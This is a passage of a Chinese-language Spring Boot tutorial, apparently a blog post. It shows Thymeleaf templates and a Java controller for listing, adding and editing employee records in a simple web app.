class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--dashboard--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:replace</span>=<span class="string">&quot;commons/bar :: sidebar(activeUri=&#x27;main&#x27;)&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--dashboard--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:replace</span>=<span class="string">&quot;commons/bar :: sidebar(activeUri=&#x27;employee&#x27;)&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>此时侧边栏就可以根据页面切换高亮了。</p><h2 id="填充员工数据"><a class="markdownIt-Anchor" href="#填充员工数据"></a> 填充员工数据</h2><p>接下来我们为员工创建实体类和相对应的Repository，不记得如何编写的可以参考之前数据访问的笔记。在数据库中插入一些假数据。然后编写 EmployeeController：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmployeeController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    EmployeeRepository employeeRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/employee&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">list</span><span class="params">(Model model)</span></span>&#123;</span><br><span class="line">        List&lt;Employee&gt; employees= employeeRepository.findAll();</span><br><span class="line">        model.addAttribute(<span class="string">&quot;employees&quot;</span>, employees);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;list&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来修改 list 页面的表格部分，使用模板引擎进行替换：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;table-responsive&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table table-striped table-sm&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>LastName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>Gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>Department Id<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>Birth<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span> <span class="attr">th:each</span>=<span class="string">&quot;employee:$&#123;employees&#125;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;employee.id&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;employee.lastName&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;employee.email&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;employee.gender&#125; == 0 ? &#x27;Male&#x27; : &#x27;Female&#x27;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;employee.departmentId&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#dates.format(employee.birth, &#x27;dd/MM/yyyy&#x27;)&#125;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>现在访问员工管理页面，发现所有员工的数据已经正常展示出来了：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-22-14-34-21.png" alt="" /></p><h2 id="员工添加"><a class="markdownIt-Anchor" href="#员工添加"></a> 员工添加</h2><p>现在已经可以列出所有员工，现在我们添加增加员工的功能。首先在list界面添加相关的按钮以及他们对应的操作地址，添加员工页面的地址我们定为 <code>GET /addEmployee</code> :</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">main</span> <span class="attr">role</span>=<span class="string">&quot;main&quot;</span> <span class="attr">class</span>=<span class="string">&quot;col-md-9 ml-sm-auto col-lg-10 pt-3 px-4&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 添加按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-sm btn-primary&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/addEmployee&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/addEmployee&#125;&quot;</span>&gt;</span>Add<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br></pre></td></tr></table></figure><p>界面大概会变成这样：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-22-14-43-00.png" alt="" /></p><p>然后在 EmployeeController 中添加方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回添加员工页面</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/addEmployee&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toAddPage</span><span class="params">(Model model)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 添加员工页面需要选择部门，因此把所有部门查找出来放入model</span></span><br><span class="line">    List&lt;Department&gt; departments = departmentRepository.findAll();</span><br><span class="line">    model.addAttribute(<span class="string">&quot;departments&quot;</span>, departments);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;add&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PostMapping(&quot;/employee&quot;)</span></span><br><span class="line"><span class="comment">// Spring 会自动把收到的参数parse到Employee对象中</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">addEmployee</span><span class="params">(Employee employee)</span></span>&#123;</span><br><span class="line">    employeeRepository.save(employee);</span><br><span class="line">    <span class="comment">// 重定向到员工列表</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/employee&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们需要增加一个添加员工的模板，把 list.html 复制一份，删除main标签内的所有内容，编写一个和 Employee 类对应的表单，注意所有 <code>&lt;input&gt;</code> 标签一定要有 <code>name</code> 属性，该属性的值为 Employee 对象内对应的属性名：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;@&#123;/employee&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;lastname&quot;</span>&gt;</span>Last Name<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--Employee对象中属性名为lastName，因此name就是lastName--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;lastName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;lastname&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Bob&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;email&quot;</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;name@example.com&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;gender&quot;</span>&gt;</span>Gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;gender&quot;</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-check form-check-inline&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;form-check-input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">id</span>=<span class="string">&quot;inlineRadio1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;form-check-label&quot;</span> <span class="attr">for</span>=<span class="string">&quot;inlineRadio1&quot;</span>&gt;</span>Male<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-check form-check-inline&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;form-check-input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">id</span>=<span class="string">&quot;inlineRadio2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;form-check-label&quot;</span> <span class="attr">for</span>=<span class="string">&quot;inlineRadio2&quot;</span>&gt;</span>Female<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;department&quot;</span>&gt;</span>Department<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">multiple</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;department&quot;</span> <span class="attr">name</span>=<span class="string">&quot;departmentId&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--取出model中的Department，循环创建对应option--&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--提交到数据库中的为DepartmentId，因此value=&quot;$&#123;department.id&#125;&quot;--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">th:each</span>=<span class="string">&quot;department:$&#123;departments&#125;&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;department.departmentName&#125;&quot;</span> <span class="attr">th:value</span>=<span class="string">&quot;$&#123;department.id&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;birth&quot;</span>&gt;</span>Birth<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;birth&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;birth&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;2000-01-01&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>完成后，点击添加按钮，我们可以来到添加员工的页面：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-22-19-02-21.png" alt="" /></p><p>填入相关信息（注意日期格式为 yyyy/MM/dd），点击 Submit 按钮，我们自动跳转到了员工列表页面，并且新的员工也出现在了列表中：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-22-19-03-25.png" alt="" /></p><h2 id="员工修改"><a class="markdownIt-Anchor" href="#员工修改"></a> 员工修改</h2><p>我们可以在重用添加员工页面，不同的是如果是员工修改，那么表单中应该显示该员工原本的数据。首先为员工修改编写 controller:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 转到员工修改页面</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/employee/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toEditPage</span><span class="params">(<span class="meta">@PathVariable</span> Integer id, Model model)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 查找出员工和所有的部门</span></span><br><span class="line">    Employee employee = employeeRepository.findById(id).get();</span><br><span class="line">    model.addAttribute(<span class="string">&quot;employee&quot;</span>, employee);</span><br><span class="line">    List&lt;Department&gt; departments = departmentRepository.findAll();</span><br><span class="line">    model.addAttribute(<span class="string">&quot;departments&quot;</span>, departments);</span><br><span class="line">    <span class="comment">// 重用 Add 页面</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;add&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PutMapping(&quot;/employee/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">editEmployee</span><span class="params">(<span class="meta">@PathVariable</span> Integer id, Employee employee, Model model)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 因为是修改，我们需要把Path中的id添加到员工对象中</span></span><br><span class="line">    employee.setId(id);</span><br><span class="line">    employeeRepository.save(employee);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/employee&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后则是要对 add 页面进行修改，让他兼容员工修改的功能：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 判断页面中是否有employee这个key，从而实现不同的请求路径 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;$&#123;employee != null&#125; ? @&#123;/employee/&#125; + $&#123;employee.id&#125; : @&#123;/employee&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- HTML 表单不支持PUT请求，Spring通过添加下方的标签来实现解析PUT请求 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_method&quot;</span> <span class="attr">value</span>=<span class="string">&quot;put&quot;</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;employee!=null&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;lastname&quot;</span>&gt;</span>Last Name<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 设置value为employee的值，所有操作都要事先判断是否为空 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;lastName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;lastname&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Bob&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">th:value</span>=<span class="string">&quot;$&#123;employee!=null&#125; ? $&#123;employee.lastName&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;email&quot;</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;name@example.com&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">th:value</span>=<span class="string">&quot;$&#123;employee!=null&#125; ? $&#123;employee.email&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;gender&quot;</span>&gt;</span>Gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;gender&quot;</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-check form-check-inline&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;form-check-input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">id</span>=<span class="string">&quot;inlineRadio1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">th:checked</span>=<span class="string">&quot;$&#123;employee!=null&#125; ? $&#123;employee.gender == 0&#125;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;form-check-label&quot;</span> <span class="attr">for</span>=<span class="string">&quot;inlineRadio1&quot;</span>&gt;</span>Male<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-check form-check-inline&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;form-check-input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">id</span>=<span class="string">&quot;inlineRadio2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">th:checked</span>=<span class="string">&quot;$&#123;employee!=null&#125; ? $&#123;employee.gender == 1&#125;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;form-check-label&quot;</span> <span class="attr">for</span>=<span class="string">&quot;inlineRadio2&quot;</span>&gt;</span>Female<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;department&quot;</span>&gt;</span>Department<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">multiple</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;department&quot;</span> <span class="attr">name</span>=<span class="string">&quot;departmentId&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">th:each</span>=<span class="string">&quot;department:$&#123;departments&#125;&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">th:text</span>=<span class="string">&quot;$&#123;department.departmentName&#125;&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">th:value</span>=<span class="string">&quot;$&#123;department.id&#125;&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">th:selected</span>=<span class="string">&quot;$&#123;employee!=null&#125; ? $&#123;employee.departmentId == department.id&#125;&quot;</span></span></span><br><span class="line"><span class="tag">            &gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;birth&quot;</span>&gt;</span>Birth<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;birth&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;birth&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;2000/01/01&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">th:value</span>=<span class="string">&quot;$&#123;employee!=null&#125; ? $&#123;#dates.format(employee.birth, &#x27;yyyy/MM/dd&#x27;)&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 